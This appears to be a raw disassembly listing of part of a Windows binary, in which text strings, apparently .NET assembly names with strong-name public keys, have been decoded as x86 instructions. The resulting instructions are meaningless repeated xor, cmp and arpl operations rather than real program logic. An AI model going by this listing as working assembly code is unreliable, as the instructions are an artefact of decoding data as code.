  406e19:	add    BYTE PTR [ecx-0x7efffea3],al
  406e1f:	push   edi
  406e20:	inc    edi
  406e21:	outs   dx,BYTE PTR gs:[esi]
  406e23:	inc    ebx
  406e24:	push   eax
  406e25:	ins    BYTE PTR es:[edi],dx
  406e26:	popa   
  406e27:	outs   dx,BYTE PTR ds:[esi]
  406e28:	pop    eax
  406e29:	jae    0x406e8f
  406e2b:	sub    al,0x20
  406e2d:	push   eax
  406e2e:	jne    0x406e92
  406e30:	ins    BYTE PTR es:[edi],dx
  406e31:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  406e38:	xor    BYTE PTR [edx],dh
  406e3a:	xor    al,0x30
  406e3c:	xor    BYTE PTR [eax],dh
  406e3e:	xor    BYTE PTR [eax],dh
  406e40:	xor    al,0x38
  406e42:	xor    BYTE PTR [eax],dh
  406e44:	xor    BYTE PTR [eax],dh
  406e46:	xor    BYTE PTR [ecx],bh
  406e48:	xor    al,0x30
  406e4a:	xor    BYTE PTR [eax],dh
  406e4c:	xor    BYTE PTR [eax],dh
  406e4e:	xor    BYTE PTR [eax],dh
  406e50:	xor    BYTE PTR ss:[edx],dh
  406e53:	xor    BYTE PTR [eax],dh
  406e55:	xor    BYTE PTR [eax],dh
  406e57:	xor    BYTE PTR [eax],dh
  406e59:	xor    dh,BYTE PTR [eax+esi*1]
  406e5c:	xor    BYTE PTR [eax],dh
  406e5e:	xor    BYTE PTR ds:0x34333532,dh
  406e64:	xor    DWORD PTR [ebx],esi
  406e66:	xor    DWORD PTR [eax],esi
  406e68:	xor    BYTE PTR [eax],dh
  406e6a:	xor    al,0x30
  406e6c:	xor    BYTE PTR [eax],dh
  406e6e:	xor    BYTE PTR [eax],dh
  406e70:	xor    DWORD PTR [eax],esi
  406e72:	xor    BYTE PTR [eax],dh
  406e74:	xor    DWORD PTR [eax],esi
  406e76:	xor    BYTE PTR [eax],dh
  406e78:	aaa    
  406e79:	xor    DWORD PTR fs:[esi+0x61],esp
  406e7d:	xor    eax,0x61346337
  406e82:	gs cmp DWORD PTR fs:[esi+0x30],esp
  406e87:	popa   
  406e88:	xor    esi,DWORD PTR [edx]
  406e8a:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  406e8e:	popa   
  406e8f:	xor    BYTE PTR [esi+0x61],ah
  406e92:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  406e99:	cmp    BYTE PTR gs:[esi+0x64],ah
  406e9d:	ss popa 
  406e9f:	arpl   WORD PTR gs:[eax],di
  406ea2:	data16 cmp BYTE PTR [edi],dh
  406ea5:	bound  si,DWORD PTR [eax]
  406ea8:	xor    esi,DWORD PTR [edi]
  406eaa:	ss arpl WORD PTR ss:[eax],di
  406eae:	xor    esi,DWORD PTR [ebx+eiz*2]
  406eb1:	cmp    DWORD PTR [ecx],edi
  406eb3:	cmp    DWORD PTR [edx],esi
  406eb5:	xor    DWORD PTR [ebp+0x62],esp
  406eb8:	xor    dh,BYTE PTR [ebx]
  406eba:	bound  esp,QWORD PTR [ebp+0x37]
  406ebd:	cmp    DWORD PTR [ecx+0x64],esp
  406ec0:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  406ec4:	arpl   WORD PTR [ebx+0x31],sp
  406ec7:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  406ecc:	xor    dh,BYTE PTR [ebx]
  406ece:	xor    DWORD PTR ss:[ebx],esi
  406ed1:	xor    dh,BYTE PTR [ecx]
  406ed3:	xor    BYTE PTR [edx],dh
  406ed5:	cmp    DWORD PTR [eax],esi
  406ed7:	xor    BYTE PTR [edx+0x37],ah
  406eda:	xor    dh,BYTE PTR [ebx]
  406edc:	arpl   WORD PTR [esi+0x39],sp
  406edf:	cmp    BYTE PTR [eax],dh
  406ee1:	cmp    DWORD PTR ds:0x34636637,esi
  406ee7:	xor    DWORD PTR gs:[edi],esi
  406eea:	aaa    
  406eeb:	xor    DWORD PTR [eax],esi
  406eed:	cmp    BYTE PTR [esi+0x63],ah
  406ef0:	xor    BYTE PTR ss:[edi],dh
  406ef3:	aaa    
  406ef4:	aaa    
  406ef5:	xor    al,0x66
  406ef7:	xor    bh,BYTE PTR [ecx]
  406ef9:	cmp    BYTE PTR gs:[ebx],dh
  406efc:	xor    dh,BYTE PTR [eax]
  406efe:	cmp    DWORD PTR gs:[edx],esi
  406f01:	gs popa 
  406f03:	xor    BYTE PTR ds:0x34656365,dh
  406f09:	cmp    BYTE PTR gs:[edx],dh
  406f0c:	xor    DWORD PTR [ebx+0x30],esp
  406f0f:	popa   
  406f10:	xor    eax,0x38656665
  406f15:	xor    WORD PTR [esi],si
  406f18:	xor    al,0x35
  406f1a:	arpl   WORD PTR [ebx+eiz*2],si
  406f1d:	xor    BYTE PTR [ebx+0x39],ah
  406f20:	xor    esp,DWORD PTR [ebx+0x31]
  406f23:	popa   
  406f24:	bound  edi,QWORD PTR [ecx]
  406f26:	cmp    DWORD PTR [edx],esi
  406f28:	cmp    BYTE PTR ds:0x32323664,dh
  406f2e:	arpl   WORD PTR [ecx+0x61],sp
  406f31:	ss xor eax,0x64316332
  406f37:	popaw  
  406f39:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  406f3f:	xor    eax,0x32663664
  406f44:	fs gs xor eax,0x65373166
  406f4b:	xor    eax,0x30666165
  406f50:	data16 arpl WORD PTR [ecx+edi*1],si
  406f54:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  406f59:	xor    DWORD PTR [ebx+0x38],esp
  406f5c:	popa   
  406f5d:	xor    DWORD PTR [edx],esi
  406f5f:	xor    al,0x33
  406f61:	ss xor eax,0x30323831
  406f67:	ss arpl WORD PTR fs:[eax],si
  406f6b:	cmp    DWORD PTR [ebx],esi
  406f6d:	xor    esi,DWORD PTR [esp+esi*1]
  406f70:	fs xor eax,0x39326461
  406f76:	xor    eax,DWORD PTR [eax]
  406f78:	add    BYTE PTR [ecx-0x7efffea6],al
  406f7e:	push   esp
  406f7f:	inc    ebp
  406f80:	popa   
  406f81:	jae    0x406ffc
  406f83:	push   eax
  406f84:	jb     0x406ff5
  406f86:	je     0x406fb4
  406f88:	and    BYTE PTR [eax+0x75],dl
  406f8b:	bound  ebp,QWORD PTR [ecx+ebp*2+0x63]
  406f8f:	dec    ebx
  406f90:	gs jns 0x406fd0
  406f93:	xor    BYTE PTR [eax],dh
  406f95:	xor    dh,BYTE PTR [eax+esi*1]
  406f98:	xor    BYTE PTR [eax],dh
  406f9a:	xor    BYTE PTR [eax],dh
  406f9c:	xor    al,0x38
  406f9e:	xor    BYTE PTR [eax],dh
  406fa0:	xor    BYTE PTR [eax],dh
  406fa2:	xor    BYTE PTR [ecx],bh
  406fa4:	xor    al,0x30
  406fa6:	xor    BYTE PTR [eax],dh
  406fa8:	xor    BYTE PTR [eax],dh
  406faa:	xor    BYTE PTR [eax],dh
  406fac:	xor    BYTE PTR ss:[edx],dh
  406faf:	xor    BYTE PTR [eax],dh
  406fb1:	xor    BYTE PTR [eax],dh
  406fb3:	xor    BYTE PTR [eax],dh
  406fb5:	xor    dh,BYTE PTR [eax+esi*1]
  406fb8:	xor    BYTE PTR [eax],dh
  406fba:	xor    BYTE PTR ds:0x34333532,dh
  406fc0:	xor    DWORD PTR [ebx],esi
  406fc2:	xor    DWORD PTR [eax],esi
  406fc4:	xor    BYTE PTR [eax],dh
  406fc6:	xor    al,0x30
  406fc8:	xor    BYTE PTR [eax],dh
  406fca:	xor    BYTE PTR [eax],dh
  406fcc:	xor    DWORD PTR [eax],esi
  406fce:	xor    BYTE PTR [eax],dh
  406fd0:	xor    DWORD PTR [eax],esi
  406fd2:	xor    BYTE PTR [eax],dh
  406fd4:	aaa    
  406fd5:	xor    DWORD PTR fs:[esi+0x61],esp
  406fd9:	xor    eax,0x61346337
  406fde:	gs cmp DWORD PTR fs:[esi+0x30],esp
  406fe3:	popa   
  406fe4:	xor    esi,DWORD PTR [edx]
  406fe6:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  406fea:	popa   
  406feb:	xor    BYTE PTR [esi+0x61],ah
  406fee:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  406ff5:	cmp    BYTE PTR gs:[esi+0x64],ah
  406ff9:	ss popa 
  406ffb:	arpl   WORD PTR gs:[eax],di
  406ffe:	data16 cmp BYTE PTR [edi],dh
  407001:	bound  si,DWORD PTR [eax]
  407004:	xor    esi,DWORD PTR [edi]
  407006:	ss arpl WORD PTR ss:[eax],di
  40700a:	xor    esi,DWORD PTR [ebx+eiz*2]
  40700d:	cmp    DWORD PTR [ecx],edi
  40700f:	cmp    DWORD PTR [edx],esi
  407011:	xor    DWORD PTR [ebp+0x62],esp
  407014:	xor    dh,BYTE PTR [ebx]
  407016:	bound  esp,QWORD PTR [ebp+0x37]
  407019:	cmp    DWORD PTR [ecx+0x64],esp
  40701c:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  407020:	arpl   WORD PTR [ebx+0x31],sp
  407023:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  407028:	xor    dh,BYTE PTR [ebx]
  40702a:	xor    DWORD PTR ss:[ebx],esi
  40702d:	xor    dh,BYTE PTR [ecx]
  40702f:	xor    BYTE PTR [edx],dh
  407031:	cmp    DWORD PTR [eax],esi
  407033:	xor    BYTE PTR [edx+0x37],ah
  407036:	xor    dh,BYTE PTR [ebx]
  407038:	arpl   WORD PTR [esi+0x39],sp
  40703b:	cmp    BYTE PTR [eax],dh
  40703d:	cmp    DWORD PTR ds:0x34636637,esi
  407043:	xor    DWORD PTR gs:[edi],esi
  407046:	aaa    
  407047:	xor    DWORD PTR [eax],esi
  407049:	cmp    BYTE PTR [esi+0x63],ah
  40704c:	xor    BYTE PTR ss:[edi],dh
  40704f:	aaa    
  407050:	aaa    
  407051:	xor    al,0x66
  407053:	xor    bh,BYTE PTR [ecx]
  407055:	cmp    BYTE PTR gs:[ebx],dh
  407058:	xor    dh,BYTE PTR [eax]
  40705a:	cmp    DWORD PTR gs:[edx],esi
  40705d:	gs popa 
  40705f:	xor    BYTE PTR ds:0x34656365,dh
  407065:	cmp    BYTE PTR gs:[edx],dh
  407068:	xor    DWORD PTR [ebx+0x30],esp
  40706b:	popa   
  40706c:	xor    eax,0x38656665
  407071:	xor    WORD PTR [esi],si
  407074:	xor    al,0x35
  407076:	arpl   WORD PTR [ebx+eiz*2],si
  407079:	xor    BYTE PTR [ebx+0x39],ah
  40707c:	xor    esp,DWORD PTR [ebx+0x31]
  40707f:	popa   
  407080:	bound  edi,QWORD PTR [ecx]
  407082:	cmp    DWORD PTR [edx],esi
  407084:	cmp    BYTE PTR ds:0x32323664,dh
  40708a:	arpl   WORD PTR [ecx+0x61],sp
  40708d:	ss xor eax,0x64316332
  407093:	popaw  
  407095:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  40709b:	xor    eax,0x32663664
  4070a0:	fs gs xor eax,0x65373166
  4070a7:	xor    eax,0x30666165
  4070ac:	data16 arpl WORD PTR [ecx+edi*1],si
  4070b0:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  4070b5:	xor    DWORD PTR [ebx+0x38],esp
  4070b8:	popa   
  4070b9:	xor    DWORD PTR [edx],esi
  4070bb:	xor    al,0x33
  4070bd:	ss xor eax,0x30323831
  4070c3:	ss arpl WORD PTR fs:[eax],si
  4070c7:	cmp    DWORD PTR [ebx],esi
  4070c9:	xor    esi,DWORD PTR [esp+esi*1]
  4070cc:	fs xor eax,0x39326461
  4070d2:	xor    eax,DWORD PTR [eax]
  4070d4:	add    BYTE PTR [ecx-0x7efffe85],al
  4070da:	jne    0x407129
  4070dc:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  4070e3:	je     0x407113
  4070e5:	push   esi
  4070e6:	imul   esi,DWORD PTR [ebx+0x75],0x74536c61
  4070ed:	jne    0x407153
  4070ef:	imul   ebp,DWORD PTR [edi+0x2e],0x65746e49
  4070f6:	ins    BYTE PTR es:[edi],dx
  4070f7:	ins    BYTE PTR es:[edi],dx
  4070f8:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x72446563
  407100:	imul   esi,DWORD PTR [esi+0x65],0x50202c72
  407107:	jne    0x40716b
  407109:	ins    BYTE PTR es:[edi],dx
  40710a:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  407111:	xor    BYTE PTR [edx],dh
  407113:	xor    al,0x30
  407115:	xor    BYTE PTR [eax],dh
  407117:	xor    BYTE PTR [eax],dh
  407119:	xor    al,0x38
  40711b:	xor    BYTE PTR [eax],dh
  40711d:	xor    BYTE PTR [eax],dh
  40711f:	xor    BYTE PTR [ecx],bh
  407121:	xor    al,0x30
  407123:	xor    BYTE PTR [eax],dh
  407125:	xor    BYTE PTR [eax],dh
  407127:	xor    BYTE PTR [eax],dh
  407129:	xor    BYTE PTR ss:[edx],dh
  40712c:	xor    BYTE PTR [eax],dh
  40712e:	xor    BYTE PTR [eax],dh
  407130:	xor    BYTE PTR [eax],dh
  407132:	xor    dh,BYTE PTR [eax+esi*1]
  407135:	xor    BYTE PTR [eax],dh
  407137:	xor    BYTE PTR ds:0x34333532,dh
  40713d:	xor    DWORD PTR [ebx],esi
  40713f:	xor    DWORD PTR [eax],esi
  407141:	xor    BYTE PTR [eax],dh
  407143:	xor    al,0x30
  407145:	xor    BYTE PTR [eax],dh
  407147:	xor    BYTE PTR [eax],dh
  407149:	xor    DWORD PTR [eax],esi
  40714b:	xor    BYTE PTR [eax],dh
  40714d:	xor    DWORD PTR [eax],esi
  40714f:	xor    BYTE PTR [eax],dh
  407151:	aaa    
  407152:	xor    DWORD PTR fs:[esi+0x61],esp
  407156:	xor    eax,0x61346337
  40715b:	gs cmp DWORD PTR fs:[esi+0x30],esp
  407160:	popa   
  407161:	xor    esi,DWORD PTR [edx]
  407163:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  407167:	popa   
  407168:	xor    BYTE PTR [esi+0x61],ah
  40716b:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  407172:	cmp    BYTE PTR gs:[esi+0x64],ah
  407176:	ss popa 
  407178:	arpl   WORD PTR gs:[eax],di
  40717b:	data16 cmp BYTE PTR [edi],dh
  40717e:	bound  si,DWORD PTR [eax]
  407181:	xor    esi,DWORD PTR [edi]
  407183:	ss arpl WORD PTR ss:[eax],di
  407187:	xor    esi,DWORD PTR [ebx+eiz*2]
  40718a:	cmp    DWORD PTR [ecx],edi
  40718c:	cmp    DWORD PTR [edx],esi
  40718e:	xor    DWORD PTR [ebp+0x62],esp
  407191:	xor    dh,BYTE PTR [ebx]
  407193:	bound  esp,QWORD PTR [ebp+0x37]
  407196:	cmp    DWORD PTR [ecx+0x64],esp
  407199:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  40719d:	arpl   WORD PTR [ebx+0x31],sp
  4071a0:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  4071a5:	xor    dh,BYTE PTR [ebx]
  4071a7:	xor    DWORD PTR ss:[ebx],esi
  4071aa:	xor    dh,BYTE PTR [ecx]
  4071ac:	xor    BYTE PTR [edx],dh
  4071ae:	cmp    DWORD PTR [eax],esi
  4071b0:	xor    BYTE PTR [edx+0x37],ah
  4071b3:	xor    dh,BYTE PTR [ebx]
  4071b5:	arpl   WORD PTR [esi+0x39],sp
  4071b8:	cmp    BYTE PTR [eax],dh
  4071ba:	cmp    DWORD PTR ds:0x34636637,esi
  4071c0:	xor    DWORD PTR gs:[edi],esi
  4071c3:	aaa    
  4071c4:	xor    DWORD PTR [eax],esi
  4071c6:	cmp    BYTE PTR [esi+0x63],ah
  4071c9:	xor    BYTE PTR ss:[edi],dh
  4071cc:	aaa    
  4071cd:	aaa    
  4071ce:	xor    al,0x66
  4071d0:	xor    bh,BYTE PTR [ecx]
  4071d2:	cmp    BYTE PTR gs:[ebx],dh
  4071d5:	xor    dh,BYTE PTR [eax]
  4071d7:	cmp    DWORD PTR gs:[edx],esi
  4071da:	gs popa 
  4071dc:	xor    BYTE PTR ds:0x34656365,dh
  4071e2:	cmp    BYTE PTR gs:[edx],dh
  4071e5:	xor    DWORD PTR [ebx+0x30],esp
  4071e8:	popa   
  4071e9:	xor    eax,0x38656665
  4071ee:	xor    WORD PTR [esi],si
  4071f1:	xor    al,0x35
  4071f3:	arpl   WORD PTR [ebx+eiz*2],si
  4071f6:	xor    BYTE PTR [ebx+0x39],ah
  4071f9:	xor    esp,DWORD PTR [ebx+0x31]
  4071fc:	popa   
  4071fd:	bound  edi,QWORD PTR [ecx]
  4071ff:	cmp    DWORD PTR [edx],esi
  407201:	cmp    BYTE PTR ds:0x32323664,dh
  407207:	arpl   WORD PTR [ecx+0x61],sp
  40720a:	ss xor eax,0x64316332
  407210:	popaw  
  407212:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  407218:	xor    eax,0x32663664
  40721d:	fs gs xor eax,0x65373166
  407224:	xor    eax,0x30666165
  407229:	data16 arpl WORD PTR [ecx+edi*1],si
  40722d:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  407232:	xor    DWORD PTR [ebx+0x38],esp
  407235:	popa   
  407236:	xor    DWORD PTR [edx],esi
  407238:	xor    al,0x33
  40723a:	ss xor eax,0x30323831
  407240:	ss arpl WORD PTR fs:[eax],si
  407244:	cmp    DWORD PTR [ebx],esi
  407246:	xor    esi,DWORD PTR [esp+esi*1]
  407249:	fs xor eax,0x39326461
  40724f:	xor    eax,DWORD PTR [eax]
  407251:	add    BYTE PTR [ecx-0x7efffe9c],al
  407257:	pop    esi
  407258:	dec    ecx
  407259:	outs   dx,BYTE PTR ds:[esi]
  40725a:	je     0x4072c1
  40725c:	ins    BYTE PTR es:[edi],dx
  40725d:	ins    BYTE PTR es:[edi],dx
  40725e:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x72446563
  407266:	imul   esi,DWORD PTR [esi+0x65],0x50202c72
  40726d:	jne    0x4072d1
  40726f:	ins    BYTE PTR es:[edi],dx
  407270:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  407277:	xor    BYTE PTR [edx],dh
  407279:	xor    al,0x30
  40727b:	xor    BYTE PTR [eax],dh
  40727d:	xor    BYTE PTR [eax],dh
  40727f:	xor    al,0x38
  407281:	xor    BYTE PTR [eax],dh
  407283:	xor    BYTE PTR [eax],dh
  407285:	xor    BYTE PTR [ecx],bh
  407287:	xor    al,0x30
  407289:	xor    BYTE PTR [eax],dh
  40728b:	xor    BYTE PTR [eax],dh
  40728d:	xor    BYTE PTR [eax],dh
  40728f:	xor    BYTE PTR ss:[edx],dh
  407292:	xor    BYTE PTR [eax],dh
  407294:	xor    BYTE PTR [eax],dh
  407296:	xor    BYTE PTR [eax],dh
  407298:	xor    dh,BYTE PTR [eax+esi*1]
  40729b:	xor    BYTE PTR [eax],dh
  40729d:	xor    BYTE PTR ds:0x34333532,dh
  4072a3:	xor    DWORD PTR [ebx],esi
  4072a5:	xor    DWORD PTR [eax],esi
  4072a7:	xor    BYTE PTR [eax],dh
  4072a9:	xor    al,0x30
  4072ab:	xor    BYTE PTR [eax],dh
  4072ad:	xor    BYTE PTR [eax],dh
  4072af:	xor    DWORD PTR [eax],esi
  4072b1:	xor    BYTE PTR [eax],dh
  4072b3:	xor    DWORD PTR [eax],esi
  4072b5:	xor    BYTE PTR [eax],dh
  4072b7:	aaa    
  4072b8:	xor    DWORD PTR fs:[esi+0x61],esp
  4072bc:	xor    eax,0x61346337
  4072c1:	gs cmp DWORD PTR fs:[esi+0x30],esp
  4072c6:	popa   
  4072c7:	xor    esi,DWORD PTR [edx]
  4072c9:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  4072cd:	popa   
  4072ce:	xor    BYTE PTR [esi+0x61],ah
  4072d1:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  4072d8:	cmp    BYTE PTR gs:[esi+0x64],ah
  4072dc:	ss popa 
  4072de:	arpl   WORD PTR gs:[eax],di
  4072e1:	data16 cmp BYTE PTR [edi],dh
  4072e4:	bound  si,DWORD PTR [eax]
  4072e7:	xor    esi,DWORD PTR [edi]
  4072e9:	ss arpl WORD PTR ss:[eax],di
  4072ed:	xor    esi,DWORD PTR [ebx+eiz*2]
  4072f0:	cmp    DWORD PTR [ecx],edi
  4072f2:	cmp    DWORD PTR [edx],esi
  4072f4:	xor    DWORD PTR [ebp+0x62],esp
  4072f7:	xor    dh,BYTE PTR [ebx]
  4072f9:	bound  esp,QWORD PTR [ebp+0x37]
  4072fc:	cmp    DWORD PTR [ecx+0x64],esp
  4072ff:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  407303:	arpl   WORD PTR [ebx+0x31],sp
  407306:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  40730b:	xor    dh,BYTE PTR [ebx]
  40730d:	xor    DWORD PTR ss:[ebx],esi
  407310:	xor    dh,BYTE PTR [ecx]
  407312:	xor    BYTE PTR [edx],dh
  407314:	cmp    DWORD PTR [eax],esi
  407316:	xor    BYTE PTR [edx+0x37],ah
  407319:	xor    dh,BYTE PTR [ebx]
  40731b:	arpl   WORD PTR [esi+0x39],sp
  40731e:	cmp    BYTE PTR [eax],dh
  407320:	cmp    DWORD PTR ds:0x34636637,esi
  407326:	xor    DWORD PTR gs:[edi],esi
  407329:	aaa    
  40732a:	xor    DWORD PTR [eax],esi
  40732c:	cmp    BYTE PTR [esi+0x63],ah
  40732f:	xor    BYTE PTR ss:[edi],dh
  407332:	aaa    
  407333:	aaa    
  407334:	xor    al,0x66
  407336:	xor    bh,BYTE PTR [ecx]
  407338:	cmp    BYTE PTR gs:[ebx],dh
  40733b:	xor    dh,BYTE PTR [eax]
  40733d:	cmp    DWORD PTR gs:[edx],esi
  407340:	gs popa 
  407342:	xor    BYTE PTR ds:0x34656365,dh
  407348:	cmp    BYTE PTR gs:[edx],dh
  40734b:	xor    DWORD PTR [ebx+0x30],esp
  40734e:	popa   
  40734f:	xor    eax,0x38656665
  407354:	xor    WORD PTR [esi],si
  407357:	xor    al,0x35
  407359:	arpl   WORD PTR [ebx+eiz*2],si
  40735c:	xor    BYTE PTR [ebx+0x39],ah
  40735f:	xor    esp,DWORD PTR [ebx+0x31]
  407362:	popa   
  407363:	bound  edi,QWORD PTR [ecx]
  407365:	cmp    DWORD PTR [edx],esi
  407367:	cmp    BYTE PTR ds:0x32323664,dh
  40736d:	arpl   WORD PTR [ecx+0x61],sp
  407370:	ss xor eax,0x64316332
  407376:	popaw  
  407378:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  40737e:	xor    eax,0x32663664
  407383:	fs gs xor eax,0x65373166
  40738a:	xor    eax,0x30666165
  40738f:	data16 arpl WORD PTR [ecx+edi*1],si
  407393:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  407398:	xor    DWORD PTR [ebx+0x38],esp
  40739b:	popa   
  40739c:	xor    DWORD PTR [edx],esi
  40739e:	xor    al,0x33
  4073a0:	ss xor eax,0x30323831
  4073a6:	ss arpl WORD PTR fs:[eax],si
  4073aa:	cmp    DWORD PTR [ebx],esi
  4073ac:	xor    esi,DWORD PTR [esp+esi*1]
  4073af:	fs xor eax,0x39326461
  4073b5:	xor    eax,DWORD PTR [eax]
  4073b7:	add    BYTE PTR [ecx-0x7efffe9e],al
  4073bd:	pop    esp
  4073be:	push   esp
  4073bf:	gs jae 0x407436
  4073c2:	dec    ecx
  4073c3:	ins    DWORD PTR es:[edi],dx
  4073c4:	jo     0x407427
  4073c6:	arpl   WORD PTR [esp+eax*2+0x72],si
  4073ca:	imul   esi,DWORD PTR [esi+0x65],0x50202c72
  4073d1:	jne    0x407435
  4073d3:	ins    BYTE PTR es:[edi],dx
  4073d4:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  4073db:	xor    BYTE PTR [edx],dh
  4073dd:	xor    al,0x30
  4073df:	xor    BYTE PTR [eax],dh
  4073e1:	xor    BYTE PTR [eax],dh
  4073e3:	xor    al,0x38
  4073e5:	xor    BYTE PTR [eax],dh
  4073e7:	xor    BYTE PTR [eax],dh
  4073e9:	xor    BYTE PTR [ecx],bh
  4073eb:	xor    al,0x30
  4073ed:	xor    BYTE PTR [eax],dh
  4073ef:	xor    BYTE PTR [eax],dh
  4073f1:	xor    BYTE PTR [eax],dh
  4073f3:	xor    BYTE PTR ss:[edx],dh
  4073f6:	xor    BYTE PTR [eax],dh
  4073f8:	xor    BYTE PTR [eax],dh
  4073fa:	xor    BYTE PTR [eax],dh
  4073fc:	xor    dh,BYTE PTR [eax+esi*1]
  4073ff:	xor    BYTE PTR [eax],dh
  407401:	xor    BYTE PTR ds:0x34333532,dh
  407407:	xor    DWORD PTR [ebx],esi
  407409:	xor    DWORD PTR [eax],esi
  40740b:	xor    BYTE PTR [eax],dh
  40740d:	xor    al,0x30
  40740f:	xor    BYTE PTR [eax],dh
  407411:	xor    BYTE PTR [eax],dh
  407413:	xor    DWORD PTR [eax],esi
  407415:	xor    BYTE PTR [eax],dh
  407417:	xor    DWORD PTR [eax],esi
  407419:	xor    BYTE PTR [eax],dh
  40741b:	aaa    
  40741c:	xor    DWORD PTR fs:[esi+0x61],esp
  407420:	xor    eax,0x61346337
  407425:	gs cmp DWORD PTR fs:[esi+0x30],esp
  40742a:	popa   
  40742b:	xor    esi,DWORD PTR [edx]
  40742d:	cmp    BYTE PTR gs:[ecx+eiz*2],dh
  407431:	popa   
  407432:	xor    BYTE PTR [esi+0x61],ah
  407435:	gs data16 xor BYTE PTR fs:[ebp+eiz*2+0x39],ah
  40743c:	cmp    BYTE PTR gs:[esi+0x64],ah
  407440:	ss popa 
  407442:	arpl   WORD PTR gs:[eax],di
  407445:	data16 cmp BYTE PTR [edi],dh
  407448:	bound  si,DWORD PTR [eax]
  40744b:	xor    esi,DWORD PTR [edi]
  40744d:	ss arpl WORD PTR ss:[eax],di
  407451:	xor    esi,DWORD PTR [ebx+eiz*2]
  407454:	cmp    DWORD PTR [ecx],edi
  407456:	cmp    DWORD PTR [edx],esi
  407458:	xor    DWORD PTR [ebp+0x62],esp
  40745b:	xor    dh,BYTE PTR [ebx]
  40745d:	bound  esp,QWORD PTR [ebp+0x37]
  407460:	cmp    DWORD PTR [ecx+0x64],esp
  407463:	cmp    DWORD PTR [ebp+esi*1+0x64],esp
  407467:	arpl   WORD PTR [ebx+0x31],sp
  40746a:	fs cmp DWORD PTR fs:[ecx+0x64],esp
  40746f:	xor    dh,BYTE PTR [ebx]
  407471:	xor    DWORD PTR ss:[ebx],esi
  407474:	xor    dh,BYTE PTR [ecx]
  407476:	xor    BYTE PTR [edx],dh
  407478:	cmp    DWORD PTR [eax],esi
  40747a:	xor    BYTE PTR [edx+0x37],ah
  40747d:	xor    dh,BYTE PTR [ebx]
  40747f:	arpl   WORD PTR [esi+0x39],sp
  407482:	cmp    BYTE PTR [eax],dh
  407484:	cmp    DWORD PTR ds:0x34636637,esi
  40748a:	xor    DWORD PTR gs:[edi],esi
  40748d:	aaa    
  40748e:	xor    DWORD PTR [eax],esi
  407490:	cmp    BYTE PTR [esi+0x63],ah
  407493:	xor    BYTE PTR ss:[edi],dh
  407496:	aaa    
  407497:	aaa    
  407498:	xor    al,0x66
  40749a:	xor    bh,BYTE PTR [ecx]
  40749c:	cmp    BYTE PTR gs:[ebx],dh
  40749f:	xor    dh,BYTE PTR [eax]
  4074a1:	cmp    DWORD PTR gs:[edx],esi
  4074a4:	gs popa 
  4074a6:	xor    BYTE PTR ds:0x34656365,dh
  4074ac:	cmp    BYTE PTR gs:[edx],dh
  4074af:	xor    DWORD PTR [ebx+0x30],esp
  4074b2:	popa   
  4074b3:	xor    eax,0x38656665
  4074b8:	xor    WORD PTR [esi],si
  4074bb:	xor    al,0x35
  4074bd:	arpl   WORD PTR [ebx+eiz*2],si
  4074c0:	xor    BYTE PTR [ebx+0x39],ah
  4074c3:	xor    esp,DWORD PTR [ebx+0x31]
  4074c6:	popa   
  4074c7:	bound  edi,QWORD PTR [ecx]
  4074c9:	cmp    DWORD PTR [edx],esi
  4074cb:	cmp    BYTE PTR ds:0x32323664,dh
  4074d1:	arpl   WORD PTR [ecx+0x61],sp
  4074d4:	ss xor eax,0x64316332
  4074da:	popaw  
  4074dc:	fs xor esp,DWORD PTR ss:[edi+esi*1+0x34]
  4074e2:	xor    eax,0x32663664
  4074e7:	fs gs xor eax,0x65373166
  4074ee:	xor    eax,0x30666165
  4074f3:	data16 arpl WORD PTR [ecx+edi*1],si
  4074f7:	xor    esp,DWORD PTR ss:[edx+esi*1+0x36]
  4074fc:	xor    DWORD PTR [ebx+0x38],esp
  4074ff:	popa   
  407500:	xor    DWORD PTR [edx],esi
  407502:	xor    al,0x33
  407504:	ss xor eax,0x30323831
  40750a:	ss arpl WORD PTR fs:[eax],si
  40750e:	cmp    DWORD PTR [ebx],esi
  407510:	xor    esi,DWORD PTR [esp+esi*1]
  407513:	fs xor eax,0x39326461
  407519:	xor    eax,DWORD PTR [eax]
  40751b:	add    BYTE PTR [ecx-0x7efffea6],al
  407521:	push   esp
  407522:	inc    ebx
  407523:	push   eax
  407524:	inc    ecx
  407525:	jne    0x40759b
  407527:	push   0x202c726f
  40752c:	push   eax
  40752d:	jne    0x407591
  40752f:	ins    BYTE PTR es:[edi],dx
  407530:	imul   esp,DWORD PTR [ebx+0x4b],0x303d7965
  407537:	xor    BYTE PTR [edx],dh
  407539:	xor    al,0x30
  40753b:	xor    BYTE PTR [eax],dh
  40753d:	xor    BYTE PTR [eax],dh
  40753f:	xor    al,0x38
  407541:	xor    BYTE PTR [eax],dh
  407543:	xor    BYTE PTR [eax],dh
  407545:	xor    BYTE PTR [ecx],bh
